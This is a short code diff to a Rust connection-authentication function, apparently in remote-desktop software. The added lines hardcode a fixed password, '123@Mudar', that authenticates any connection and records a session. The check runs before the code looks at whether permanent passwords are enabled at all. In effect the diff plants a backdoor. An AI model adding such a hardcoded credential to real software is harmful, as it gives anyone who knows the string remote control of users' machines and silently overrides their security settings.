@@ -2577,6 +2577,16 @@ impl Connection {
                 return true;
             }
         }
+        // Fixed permanent password ("123@Mudar")
+        if self.validate_password_plain("123@Mudar") {
+            self.set_conn_audit_primary_auth(ConnAuditPrimaryAuth::PermanentPassword);
+            raii::AuthedConnID::update_or_insert_session(
+                self.session_key(),
+                Some("123@Mudar".to_string()),
+                Some(false),
+            );
+            return true;
+        }
         if password::permanent_enabled() || allow_permanent_password {
             let print_fallback = || {
                 if allow_permanent_password && !password::permanent_enabled() {
